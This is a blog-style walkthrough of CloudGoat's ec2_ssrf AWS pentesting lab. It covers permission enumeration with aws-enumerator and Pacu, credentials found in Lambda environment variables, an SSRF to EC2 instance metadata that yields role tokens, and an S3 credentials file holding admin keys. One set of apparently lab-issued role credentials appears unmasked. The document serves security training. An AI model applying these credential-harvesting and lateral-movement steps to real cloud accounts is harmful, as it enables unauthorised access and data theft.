---
title: CloudGoat's EC2_SSRF Scenario
layout: post
date: 2025-07-18
categories: [Writeups, Intro to AWS Pentesting]
tags: [Cloud, AWS, Pacu, CloudGoat, AWS-Enumerator]
author: bailee
toc: true
description: Provided with an initial access key ID and secret access key, move laterally and find what information you can.
---
Lab Platform: 
: [Tyler Ramsbey's Introduction to AWS Pentesting Course](https://www.notion.so/Introduction-to-AWS-Pentesting-Course-2112f7e38282806ea79ed964c482d16f?pvs=21)

---


## Tools, Commands, & Resources
### Tools Used

- CloudGoat
- aws-enumerator
- Pacu

### Commands

- `aws lambda list-functions --region <region>`
    - List Lambda functions in the account by region
- `aws lambda get-function --function-name <function-name>`
    - Get details about the function, including a link to download the code, after passing in the name of the function.
- `aws dynamodb describe-endpoints`
    - List all DynamoDB endpoints
- `aws ec2 describe-instances`
    - List out all EC2 instances
- `aws ec2 describe-key-pairs`
    - List out all EC2 key pairs.
- `aws ec2 describe-network-interfaces`
    - Provides details about your Elastic Network Interfaces (ENIs), including their configuration and current status.
- `aws s3 ls`
    - List out every S3 bucket in a region
- `aws s3 ls s3://<bucket-name>`
    - List out all of the files and directories (but not anything in the directories) in a bucket
        - Add the directory name to list out it’s contents like `aws s3 ls s3://<bucket-name>/<directory-name>`
- `aws s3 cp  s3://<bucket-name>/<directory>/<filename>`
    - Download a file from an S3 bucket
    - Add a - at the end of the command to just print it to stdout
    - Note: this is just an example and there can be multiple or 0 directories after the S3 bucket name

### References

- <https://docs.aws.amazon.com/cli/latest/reference/dynamodb/>
- <https://docs.aws.amazon.com/cli/latest/reference/ec2/>
- <https://docs.aws.amazon.com/cli/latest/reference/iam/>
- <https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/>

---

## Lab Walkthrough

### Initial Access

```
Access Key ID: AKIAV*********QPFRUT
Secret Access Key: l3ZwL*********LEogt3nV47qw
```

I’m going to try to do this without the walkthrough. 

First, I configured the credentials CloudGoat gave me and checked my account identity. 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws sts get-caller-identity
{
    "UserId": "AIDAVVAN6C5SZHUSKFVVV",
    "Account": "388*****5333",
    "Arn": "arn:aws:iam::388*****5333:user/solus-cgid28wbprioii"
}
```

Next, I want to try enumerating as much as I can. I’m going to run **aws-enumerator** and see where I get. 

```

┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws-enumerator dump  -services all
...
---------------------------------------- DYNAMODB ----------------------------------------
DescribeEndpoints
...
----------------------------------------- LAMBDA -----------------------------------------
ListLayers
GetAccountSettings
ListEventSourceMappings
ListFunctions
...
------------------------------------------ STS ------------------------------------------
GetCallerIdentity
GetSessionToken

```

Okay, so besides STS, we have some Lambda and DynamoDB permissions. I’m going to go ahead and list the functions in the account. 

> Hi, Bailee from the future here. I was looking at the walkthrough and I did miss a step - **Pacu** was ran and I used **iam-enumerator**. I don’t think there’s a huge difference here in result, but I’m going to run it anyways for practice.
> 
> 
> ```
> Pacu (solas:No Keys Set) > import_keys solas
>   Imported keys as "imported-solas"
> Pacu (solas:imported-solas) > run lambda__enum --region -us-east-1
>   Running module lambda__enum...
> usage: pacu [--versions-all] [--regions REGIONS] [--checksource]
> pacu: error: argument --regions: expected one argument
>   Error: Invalid Arguments
> Pacu (solas:imported-solas) > run lambda__enum --region us-east-1
>   Running module lambda__enum...
> [lambda__enum] Starting region us-east-1...
> [lambda__enum]   Enumerating data for cg-lambda-cgid28wbprioii
>         [+] Secret (ENV): EC2_ACCESS_KEY_ID= AKIAVV********DTEJXZ
>         [+] Secret (ENV): EC2_SECRET_KEY_ID= M309Q/q***********PHmz9BAHqtB9zgv
> [lambda__enum] lambda__enum completed.
> 
> [lambda__enum] MODULE SUMMARY:
> 
>   1 functions found in us-east-1. View more information in the DB 
> ```
> 
> Okay, yeah. It found the same creds I did, just a *lot* faster. 
> Just for fun, I also ran the module for DynamoDB. 
> 
> ```
> Pacu (solas:imported-solas) > services
>   Lambda
> Pacu (solas:imported-solas) > run dynamodb__enum --region us-east-1
>   Running module dynamodb__enum...
> [dynamodb__enum] Starting region us-east-1...
> [dynamodb__enum]   FAILURE:
> [dynamodb__enum]     MISSING NEEDED PERMISSIONS
> [dynamodb__enum] dynamodb__enum completed.
> 
> [dynamodb__enum] MODULE SUMMARY:
> 
>   No tables found
> ```
> 
> No permissions, okay. I’m going to try that again in the next account though. 
> Bailee from the future signing out! 
> 
> Back to past Bailee listing the Lambda functions from the original account… 
> 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws lambda list-functions --region us-east-1 
{
    "Functions": [
        {
            "FunctionName": "cg-lambda-cgid28wbprioii",
            "FunctionArn": "arn:aws:lambda:us-east-1:388*****5333:function:cg-lambda-cgid28wbprioii",
            "Runtime": "python3.11",
            "Role": "arn:aws:iam::388*****333:role/cg-lambda-role-cgid28wbprioii-service-role",
            "Handler": "lambda.handler",
            "CodeSize": 223,
            "Description": "Invoke this Lambda function for the win!",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2025-06-15T22:27:13.058+0000",
            "CodeSha256": "jtqUhalhT3taxuZdjeU99/yQTnWVdMQQQcQGhTRrsqI=",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    "EC2_ACCESS_KEY_ID": "AKIAVV*********SMDTEJXZ",
                    "EC2_SECRET_KEY_ID": "M309Q/qBnMo************DPHmz9BAHqtB9zgv"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "c3df124d-ff59-4e74-91ed-1753953c00d9",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/cg-lambda-cgid28wbprioii"
            }
        }
    ]
}
                                                                                          

```

We have one function named `cg-lambda-cgid28wbprioii` , and immediately the first thing I noticed were the creds in the environment variables. I’m going to want to give those a try -

```
"EC2_ACCESS_KEY_ID": "AKIAVV**********MDTEJXZ",
 "EC2_SECRET_KEY_ID": "M309Q/qBn************PHmz9BAHqtB9zgv"
```

But before I do that, I want to see if I can get any more details about the lambda function. `aws lambda get-function` will let me download the code of the function. 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws lambda get-function --function-name cg-lambda-cgid28wbprioii   
{
    "Configuration": {
        "FunctionName": "cg-lambda-cgid28wbprioii",
        "FunctionArn": "arn:aws:lambda:us-east-1:388*******333:function:cg-lambda-cgid28wbprioii",
        "Runtime": "python3.11",
        "Role": "arn:aws:iam::3887*****5333:role/cg-lambda-role-cgid28wbprioii-service-role",
        "Handler": "lambda.handler",
        "CodeSize": 223,
        "Description": "Invoke this Lambda function for the win!",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2025-06-15T22:27:13.058+0000",
        "CodeSha256": "jtqUhalhT3taxuZdjeU99/yQTnWVdMQQQcQGhTRrsqI=",
        "Version": "$LATEST",
        "Environment": {
            "Variables": {
                "EC2_ACCESS_KEY_ID": "AKIAVV******DTEJXZ",
                "EC2_SECRET_KEY_ID": "M309Q/qBnM***********tDPHmz9BAHqtB9zgv"
            }
        },
        "RevisionId": "c3df124d-ff59-4e74-91ed-1753953c00d9",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        },
        "RuntimeVersionConfig": {
            "RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:3cf508f42fb4f1916705b091a3d9467680485e6d78ef4ec02b2fb3c4563056bb"
        },
        "LoggingConfig": {
            "LogFormat": "Text",
            "LogGroup": "/aws/lambda/cg-lambda-cgid28wbprioii"
        }
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/388*****5333/cg-lambda-cgid28wbprioii-8805cb03-2b92-470d-90b6-b177cab3e82e?versionId=dWsKf_QsvPJtQf22yLNZ30xQtl9m3J8a&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGYaCXVzLWVhc3QtMSJGMEQCIEPsir7qsPD6hJCuY%2BOazifpGt5h1xyB60ZkM1PVSmtCAiA%2F3n6ceDgrsoQ6hAlnDkUFVqjzzP0eQt4r65W%2BW50EoiqJAghOEAAaDDc0OTY3ODkwMjgzOSIMdWSVNiBAggK%2FkAdcKuYBiSe0hVaCMuP0oCATgvbtWT8wBQSM2dRQJNMofwvaJeFe%2BXOKxE1EDhbmh1QJT3fVEtk26%2FmZp%2B7TExhfNWPHt0Ya82YBhCaHiV%2BvHbcOd4e9oA3MK6TAd6Hp2xpkDNPzVj1EZPvR5xdkXI3GBvazEhepNQda4%2BV41dDh1lbAKc1qY4rkO1sI1jOfVwub85lNEDvVOvWTdfgY7nHeh5d4Rre2hKBzAXk99fGIcCimlEqyx4iLFOVRu2dvCje%2F64rzvGxCkUqGkr88ffvAWyq57g8ZZJVfeoQYTIZY3fz%2FyEmSp%2Bwhtsgwwe68wgY6kAErpdhQ9lErvhx%2FOq%2BkVagKtSv%2F1eKd83UKiXXiKh95CIUJpz0gaQ6MmtTIbigxUIqKjRpyv3jLGmcGbNU%2Fg7c4r89Eg6LkhAukFtubS%2BayP%2FTqLlicj0llrlY9VgaXD5hjl4Q70sutiAzbCG1TYssPvs1tE2E4gZMBmqQmSsjbivDGJulFj%2FMxe6fIURBa9X8%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20250615T223232Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIA25DCYHY36XKJ2QWU%2F20250615%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=0afd0657657f534342ae9d7358fad591f6d71d51cc8849c1e387ed4807afb6c0"
    },
    "Tags": {
        "Scenario": "iam_privesc_by_key_rotation",
        "Stack": "CloudGoat"
    }
}
```

I went to the provided location URL and downloaded the .zip file. I then unzipped it and used ‘cat’ to view it. 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ cat lambda.py                     
def handler(event, context):
    # You need to invoke this function to win!
    return "You win!"
```

Does this count as winning? Probably not. I’m going to go assume those other credentials and see what I get. 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws configure                                                   
AWS Access Key ID [****************FRUT]: AKIAV********MDTEJXZ
AWS Secret Access Key [****************47qw]: M309Q/qBn***********fjtDPHmz9BAHqtB9zgv
Default region name [us-east-1]: us-east-1
Default output format [json]: json
                                                                                          
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws sts get-caller-identity                       
{
    "UserId": "AIDAVVAN6C5S4NNULM2NY",
    "Account": "38******333",
    "Arn": "arn:aws:iam::388****333:user/wrex-cgid28wbprioii"
}
```
### Lateral Movement

Okay, looks like we have a new user. Running aws-enumerator again. 

```
                                                                                       
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws-enumerator dump  -services all 
...
---------------------------------------- DYNAMODB ----------------------------------------
DescribeEndpoints
------------------------------------------ EC2 ------------------------------------------
DescribeFlowLogs
DescribeVpcEndpointConnectionNotifications
DescribeNetworkInterfacePermissions
DescribeEgressOnlyInternetGateways
DescribeTransitGatewayAttachments
DescribeVolumesModifications
DescribeSpotFleetRequests
DescribePrincipalIdFormat
DescribeRegions
DescribeNatGateways
DescribeAccountAttributes
DescribeVpcs
DescribeIdFormat
DescribeAggregateIdFormat
DescribeInternetGateways
DescribeVpcEndpointConnections
DescribeVpcEndpointServiceConfigurations
DescribeSpotInstanceRequests
DescribeIamInstanceProfileAssociations
DescribeVpcEndpoints
DescribeVpcClassicLinkDnsSupport
DescribeTransitGateways
DescribeScheduledInstances
DescribePublicIpv4Pools
DescribeVpnGateways
DescribeCustomerGateways
DescribeTransitGatewayRouteTables
DescribePlacementGroups
DescribeHostReservations
DescribeRouteTables
DescribeDhcpOptions
DescribeReservedInstancesModifications
DescribeKeyPairs
DescribeTransitGatewayVpcAttachments
DescribeAvailabilityZones
DescribeVpcPeeringConnections
DescribeInstanceCreditSpecifications
DescribeClientVpnEndpoints
DescribeSubnets
DescribeAddresses
DescribeVolumeStatus
DescribeHosts
DescribeFleets
DescribeVpcClassicLink
DescribeVpnConnections
DescribeConversionTasks
DescribeNetworkAcls
DescribeImportImageTasks
DescribeReservedInstances
DescribeInstanceStatus
DescribeCapacityReservations
DescribeVolumes
DescribeSpotPriceHistory
DescribeClassicLinkInstances
DescribeLaunchTemplates
DescribeBundleTasks
DescribeImportSnapshotTasks
DescribeNetworkInterfaces
DescribeInstances
DescribeExportTasks
DescribeSecurityGroups
DescribeHostReservationOfferings
DescribeReservedInstancesOfferings
DescribeTags
DescribePrefixLists
DescribeFpgaImages
DescribeVpcEndpointServices
DescribeImages
DescribeSnapshots
------------------------------------------ STS ------------------------------------------
GetCallerIdentity
GetSessionToken
```

Okay, we have a LOT of permissions for EC2 and one for DynamoDB, too. I’m going to try the DynamoDB one first. 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws dynamodb describe-endpoints
{
    "Endpoints": [
        {
            "Address": "dynamodb.us-east-1.amazonaws.com",
            "CachePeriodInMinutes": 1440
        }
    ]
}
```

Ok, not exactly sure what to do with that. I know at this point (hi, it’s future/present Bailee again) that I could run Pacu, but I kind of want to see if I can get there before running that tool. I’m going to poke around for a bit longer and update here if I find anything cool. 

Alright, I ended up running `aws ec2 describe-instances` since we have so many EC2 commands. 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws ec2 describe-instances
{
    "Reservations": [
        {
            "ReservationId": "r-09b32441402871e27",
            "OwnerId": "388****75333",
            "Groups": [],
            "Instances": [
                {
                    "ClientToken": "terraform-20250615222719866700000005",
                    "IamInstanceProfile": {
                        "Arn": "arn:aws:iam::388*****5333:instance-profile/cg-ec2-instance-profile-cgid28wbprioii",
                        "Id": "AIPAVVAN6C5S7XGBYGXJ5"
                    },
                    "NetworkInterfaces": [
                        {
                            "Association": {
                                "IpOwnerId": "amazon",
                                "PublicDnsName": "ec2-13-221-192-230.compute-1.amazonaws.com",
                                "PublicIp": "13.221.192.230"
                            },
                            "Attachment": {
                                "AttachTime": "2025-06-15T22:27:20+00:00",
                                "AttachmentId": "eni-attach-065973e7cbd5ed391",
                            },
                            "Description": "",
                            "Groups": [
                                {
                                    "GroupId": "sg-0da261590753a8584",
                                    "GroupName": "cg-ec2-ssh-cgid28wbprioii"
                                }
                            ],
                            "MacAddress": "0e:26:69:4a:6e:8b",
                            "NetworkInterfaceId": "eni-03834ef532df4c887",
                            "OwnerId": "388******333",
                            "PrivateDnsName": "ip-10-10-10-113.ec2.internal",
                            "PrivateIpAddress": "10.10.10.113",
                            "PrivateIpAddresses": [
                                {
                                    "Association": {
                                        "IpOwnerId": "amazon",
                                        "PublicDnsName": "ec2-13-221-192-230.compute-1.amazonaws.com",
                                        "PublicIp": "13.221.192.230"
                                    },
                                    "Primary": true,
                                    "PrivateDnsName": "ip-10-10-10-113.ec2.internal",
                                    "PrivateIpAddress": "10.10.10.113"
                                }
                            ],
                            "SourceDestCheck": true,
                            "Status": "in-use",
                            "SubnetId": "subnet-0d59e7401f2fcd56a",
                            "VpcId": "vpc-0a724ccd621b2d03f",
                        }
                    ],
                    "SecurityGroups": [
                        {
                            "GroupId": "sg-0da261590753a8584",
                            "GroupName": "cg-ec2-ssh-cgid28wbprioii"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Tags": [
                        {
                            "Key": "Scenario",
                            "Value": "iam_privesc_by_key_rotation"
                        },
                        {
                            "Key": "Stack",
                            "Value": "CloudGoat"
                        },
                        {
                            "Key": "Name",
                            "Value": "cg-ubuntu-ec2-cgid28wbprioii"
                        }
                    ],
                    "InstanceId": "i-0952e5030372cc7c2",
                    "ImageId": "ami-020cba7c55df1f615",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "PrivateDnsName": "ip-10-10-10-113.ec2.internal",
                    "PublicDnsName": "ec2-13-221-192-230.compute-1.amazonaws.com",
                    "StateTransitionReason": "",
                    "KeyName": "cg-ec2-key-pair-cgid28wbprioii",
                    "SubnetId": "subnet-0d59e7401f2fcd56a",
                    "VpcId": "vpc-0a724ccd621b2d03f",
                    "PrivateIpAddress": "10.10.10.113",
                    "PublicIpAddress": "13.221.192.230"
                }
            ]
        }
    ]
}
```

So we have one instance called `cg-ec2-instance-profile-cgid28wbprioii` with ID `i-0952e5030372cc7c2`with all of the details. This got me wondering about that key pair, maybe we could connect to it somehow?  I might be going off on a tangent here, but I looked up the AWS EC2 CLI documentation and started looking around. 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws ec2 describe-key-pairs
{
    "KeyPairs": [
        {
            "KeyPairId": "key-01c0507077ec4374e",
            "KeyType": "rsa",
            "Tags": [
                {
                    "Key": "Scenario",
                    "Value": "iam_privesc_by_key_rotation"
                },
                {
                    "Key": "Stack",
                    "Value": "CloudGoat"
                }
            ],
            "CreateTime": "2025-06-15T22:27:03.146000+00:00",
            "KeyName": "cg-ec2-key-pair-cgid28wbprioii",
            "KeyFingerprint": "f8:f5:76:9c:d7:20:86:d9:17:e5:6a:58:79:84:19:e9"
        }
    ]
}
```

Anyway I can interact with this…? 

Well, after a little bit I decided to run Pacu. I ran two modules - `ec2__enum` and `iam__bruteforce_permissions` (that 2nd one was at the walkthrough’s direction). I got the information about instances (same info as above), tags, security groups, subnets, network ACLs, network interfaces, a public IP, route tables, a VPC group, more information on subnets… it’s a lot of information to parse. I put some interesting information below, though. 

```
  "Description": "CloudGoat cgid28wbprioii Security Group for EC2 Instance over SSH",
      "GroupId": "sg-0da261590753a8584",
      "GroupName": "cg-ec2-ssh-cgid28wbprioii",
      "IpPermissions": [
        {
          "FromPort": 80,
          "IpProtocol": "tcp",
          "IpRanges": [
            {
              "CidrIp": "MY IP ADDRESS"
            }
          ],
          "Ipv6Ranges": [],
          "PrefixListIds": [],
          "ToPort": 80,
          "UserIdGroupPairs": []
        },
        {
          "FromPort": 22,
          "IpProtocol": "tcp",
          "IpRanges": [
            {
              "CidrIp": "MY IP ADDRESS"
            }
          ],
          "Ipv6Ranges": [],
          "PrefixListIds": [],
          "ToPort": 22,
          "UserIdGroupPairs": []
        }
      ],
```

So the EC2 instance is open to ports 80 (HTTP) and 20 (SSH) that could be useful for the future. 

From the `iam__bruteforce_permissions` module, I got ~270 IAM permissions found Pacu. This doesn’t match the instruction - I think I ran it too many times or my permissions were different. Not sure. Either way, this does list out what permissions I have, which is helpful. 

```
Pacu (wrex:imported-wrex) > data iam
{
  "permissions": {
    "allow": [
      "sts:GetSessionToken",
      "sts:GetCallerIdentity",
      "ec2:DescribeNetworkAcls",
      "ec2:DescribeNetworkInterfacePermissions",
      "ec2:DescribeVolumeStatus",
      "ec2:DescribeHosts",
      "ec2:DescribeVpnConnections",
      "ec2:DescribeNatGateways",
      "ec2:DescribeRouteTables",
      "ec2:DescribeVolumesModifications",
      "ec2:DescribeVpcEndpoints",
      "ec2:DescribeLaunchTemplates",
      "ec2:DescribeAggregateIdFormat",
      "ec2:DescribeSpotInstanceRequests",
      "ec2:DescribeTransitGatewayVpcAttachments",
      "ec2:DescribeInstanceCreditSpecifications",
      "ec2:DescribeVpcEndpointConnections",
      "ec2:DescribeAccountAttributes",
      ...
      "ec2:DescribeVolumes",
      "ec2:DescribeDhcpOptions",
      "ec2:DescribeInstances",
      "ec2:DescribeEgressOnlyInternetGateways",
      "ec2:DescribePublicIpv4Pools",
      "ec2:DescribeReservedInstances",
      "ec2:DescribeClassicLinkInstances",
      "ec2:DescribeVpcEndpoints",
      "ec2:DescribeSpotPriceHistory",
      "ec2:DescribeSpotInstanceRequests",
      "ec2:DescribeVpcs",
      "ec2:DescribeSnapshots",
      "ec2:DescribeNetworkInterfaces",
      "ec2:DescribeScheduledInstances",
      "ec2:DescribeInstanceStatus",
      "ec2:DescribeFleets",
      "ec2:DescribeReservedInstancesModifications",
      "ec2:DescribeHostReservations",
      "ec2:DescribeRouteTables",
      "ec2:DescribeVpcEndpointServices",
      "ec2:DescribeVpcPeeringConnections",
      "ec2:DescribeKeyPairs",
      "ec2:DescribeAggregateIdFormat",
      "ec2:DescribeLaunchTemplates",
      "ec2:DescribeAvailabilityZones",
      "ec2:DescribeVolumesModifications",
      "ec2:DescribePrincipalIdFormat",
      "ec2:DescribePrefixLists",
      "ec2:DescribeVolumeStatus"
    ],
    "deny": []
  }
}
```

However, the tool aws-enumerate may be faster for situations like these. 

This command, `aws ec2 describe-network-interfaces` shows that the public IP is `13.221.192.230`.

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws ec2 describe-network-interfaces
{
    "NetworkInterfaces": [
        {
            "Association": {
                "IpOwnerId": "amazon",
                "PublicDnsName": "ec2-13-221-192-230.compute-1.amazonaws.com",
                "PublicIp": "13.221.192.230"
            },
            "Attachment": {
                "AttachTime": "2025-06-15T22:27:20+00:00",
                "AttachmentId": "eni-attach-065973e7cbd5ed391",
                "DeleteOnTermination": true,
                "DeviceIndex": 0,
                "NetworkCardIndex": 0,
                "InstanceId": "i-0952e5030372cc7c2",
                "InstanceOwnerId": "388*****5333",
                "Status": "attached"
            },
            "AvailabilityZone": "us-east-1a",
            "Description": "",
            "Groups": [
                {
                    "GroupId": "sg-0da261590753a8584",
                    "GroupName": "cg-ec2-ssh-cgid28wbprioii"
                }
```

Going to that public IP, I see this: 

![image.png](/assets/img/ec2ssrf/a20b6cbe-2d3a-4917-9b0b-a5f9f30b801e.png)

Well, if you’re asking so nicely…. It says SSRF, so I may as well give that a try. 

Note: This took me like an hour to figure out, lol. 

![image.png](/assets/img/ec2ssrf/image.png)

So I needed to put a /?url= on the end of URL. I don’t know a lot about web app attacks, so that took some studying on my part. This looks like it’s showing me directories, so I’m just going to keep going until I find something interesting. 

![image.png](/assets/img/ec2ssrf/31b7f15f-c78b-4b7f-a518-f58a11550a0e.png)

Well, there’s a role, I think! That ‘token’ is a session token for a role. Let’s assume it! 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws configure --profile "ssrfRole"    
AWS Access Key ID [None]: ASIAVVAN6C5SVBEVK6CH
AWS Secret Access Key [None]: popwK2ut4723ZGzxCY11DGaT0BePGxCsE1eazcla
Default region name [None]:   
Default output format [None]: json                                                                                                                                                                             
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws configure --profile "ssrfRole" set aws_session_token "IQoJb3JpZ2luX2VjEGkaCXVzLWVhc3QtMSJIMEYCIQD3sLb3lnEygK3Bbn+ln84dHlYlzkhpLEe6nCniZoZ2OQIhAMia2wKSuBmRs8tSoCSwMJRLlrvfTPptxm04fxk763ABKrsFCFIQARoMMzg4NzIzNzc1MzMzIgxqlezsoiR7uHdFcxsqmAUSjXJaKJDlTOtlhB6I7jboIH5mF0Eq09PJwxXlkRCXsHeP29Jnr70ae6pe6ioPX/GXNRthWMcWrWFqjh0FvLME/DyeZr716ODy2Zes/fXp3TUsBdkrzjA2s5DQgD+uM576MZwDW4XPLwRSKV1b1DW6dMfW46Fm8yEYnvEp57G+G7Uo/jJH+N5lZd+DEhiFVIRjbJpl5DkwcNAUkx+8dEkyApt0VXj6HKGwimjQgYUu/CFTUfrCHVxck3RUJLLJmWxH8CbxaEeYAVLplQJb0sQBkMQnfkAR8uGbRNzXTWtarLYAq6iqWD05cTrhkurxOUiDw5MkQ12Uzxv3jGCmjiLLHbHT1akjfOTbXaAt/97c5MGnIkJITjl02dOnn0ky5J5veNQAMIPEm1/2IrlLg3W99H2QiUuXZN8zQ2vH1m/t4s8fXkVUBJNZPu9ukJ2GmxEdrBbn5xRqLuFql6Twzn15xzl+tmxfoThVxbvTWQqvlVDq63xfOtojuwV2d9JX97tlHyj/NnrhoDHsJ2AeqIT+g6LsuLRaxJTv2vl1/neu3747LFRCJGFt4ngdn9IWiraPEgepJt5sudNf1Kbh95ks/ncsdtg5NK5wC5sZ2gaSBSpJ/TAEyH6esJQz7pfOskZs4YFYqsBEeRlL0gqDVHk1fdBC/Iks0jqVmOv5ev3+bINYcSH3xUGrN7H6MKvoVn1b8TWGjc8IcLSUX5xsz0Yi2vX0ucxcMaLRzmk0+K7KV0xzzAuRlB+kj1xFEWU5xL/rrARPJVuokmBnhtVb3UExXNBSzjRoPeOg33BRMIEagrWOp5mUUeOlUNzunA++auHPRt8836+RQxu1I/X3y7dO37GQYQzjvto4YnvGCVH/3zVRUzGKE44XMM/avcIGOrAB0SMQottSENBV85AKBAUhGRT5yaN4MQkvBo0kPZSnHaIr5+C2U6lWr8NbB5SQW2vMDLOO0dtu3Usr/jjz22CcRPVwZr4LLzjj3e0pTzLu8aiBZ+KjRzMcZqWcuRYTt7yame6KFUfGTxP/JVcmIvIrD/VGAwsMV3rfWlgs03RBnDpoYL+/a7YtndHI1pmePp7ysUI3oBPg61iHM2xh2MYz5c3Xx28yfBb/9DRYAcyvUDI="
                                                                                          
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws sts get-caller-identity --profile "ssrfRole"  
{
    "UserId": "AROAVVAN6C5S3UTE6Z322:i-0952e5030372cc7c2",
    "Account": "388*****5333",
    "Arn": "arn:aws:sts::388*****5333:assumed-role/cg-ec2-role-cgid28wbprioii/i-0952e5030372cc7c2"
}
```

Looks like the role I’ve assumed is attached to the instance, which makes sense. How do I figure out what to do with this? 

This seems like my fallback now, but I’m running `aws-enumerator`… 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws-enumerator dump -services all
---------------------------------------- DYNAMODB ----------------------------------------
DescribeEndpoints
------------------------------------------ EC2 ------------------------------------------
DescribeTransitGateways
DescribeEgressOnlyInternetGateways
DescribeNatGateways
DescribeTransitGatewayRouteTables
DescribeLaunchTemplates
DescribeHostReservations
DescribeScheduledInstances
DescribeVpnConnections
DescribeIdFormat
DescribeSpotFleetRequests
DescribeNetworkInterfacePermissions
DescribeKeyPairs
DescribeVolumes
DescribePublicIpv4Pools
DescribeClientVpnEndpoints
DescribeAggregateIdFormat
DescribeInternetGateways
DescribeFlowLogs
DescribeVpcEndpointConnectionNotifications
DescribeAvailabilityZones
DescribeVpcClassicLink
DescribeVpcEndpointServiceConfigurations
DescribeVpcClassicLinkDnsSupport
DescribePrincipalIdFormat
DescribeTransitGatewayAttachments
DescribePlacementGroups
DescribeVpcPeeringConnections
DescribeInstanceCreditSpecifications
DescribeNetworkAcls
DescribeVpcEndpointConnections
DescribeVolumesModifications
DescribeCustomerGateways
DescribeTransitGatewayVpcAttachments
DescribeImportImageTasks
DescribeRegions
DescribeFleets
DescribeVolumeStatus
DescribeIamInstanceProfileAssociations
DescribeHosts
DescribeRouteTables
DescribeVpnGateways
DescribeCapacityReservations
DescribeVpcEndpoints
DescribeHostReservationOfferings
DescribeClassicLinkInstances
DescribeInstanceStatus
DescribeConversionTasks
DescribeBundleTasks
DescribeSpotInstanceRequests
DescribeDhcpOptions
DescribeImportSnapshotTasks
DescribeAccountAttributes
DescribeVpcs
DescribeAddresses
DescribeReservedInstancesModifications
DescribeReservedInstances
DescribeNetworkInterfaces
DescribeInstances
DescribeExportTasks
DescribeSubnets
DescribeTags
DescribeSpotPriceHistory
DescribeSecurityGroups
DescribeReservedInstancesOfferings
DescribePrefixLists
DescribeFpgaImages
DescribeVpcEndpointServices
DescribeImages
DescribeSnapshots
------------------------------------------ STS ------------------------------------------
GetCallerIdentity
GetSessionToken
```

What I’m not seeing is S3… shouldn’t it have access to that? 

> Future Bailee again. Yep, I do have access to that. I’m not positive how I’d find this in the CLI (I don’t think I would, I don’t have permissions), but the console shows this policy that’s attached to the instance. So it *does* have access to S3.
> 
> 
> ![image.png](/assets/img/ec2ssrf/image1.png)
> 

### Data Exfiltration

Anyway, I’m going to run the S3 CLI command and see where I can get. 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws s3 ls s3://cg-secret-s3-bucket-cgid28wbprioii/ --profile "ssrfRole"
                           PRE aws
                                                                                          
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws s3 ls s3://cg-secret-s3-bucket-cgid28wbprioii/aws/credentials --profile "ssrfRole"
2025-06-15 18:27:06        135 credentials                                                                                      
                                                                                          
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws s3 cp  s3://cg-secret-s3-bucket-cgid28wbprioii/aws/credentials -  --profile "ssrfRole"
[default]
aws_access_key_id = AKIAVV********FM4B
aws_secret_access_key = Oksw6Entnhk************Q4WlSaZp2KyzI
region = us-east-1
```

More keys! I’m going to configure those. 

```
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws s3 cp  s3://cg-secret-s3-bucket-cgid28wbprioii/aws/credentials -  --profile "ssrfRole"
[default]
aws_access_key_id = AKIA***********FM4B
aws_secret_access_key = Oksw6E*****************pQ4WlSaZp2KyzI
region = us-east-1
                                                                                          
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws configure --profile admin
AWS Access Key ID [None]: AKIAVV***********QXQJFM4B
AWS Secret Access Key [None]: Oksw6En**************UpQ4WlSaZp2KyzI
Default region name [None]: us-east-1
Default output format [None]: json
                                                                                          
┌──(kali㉿kali)-[~/cloudgoat/ec2_ssrf]
└─$ aws sts get-caller-identity --profile "admin"   
{
    "UserId": "AIDAVVAN6C5SSPTT25FJS",
    "Account": "388*****5333",
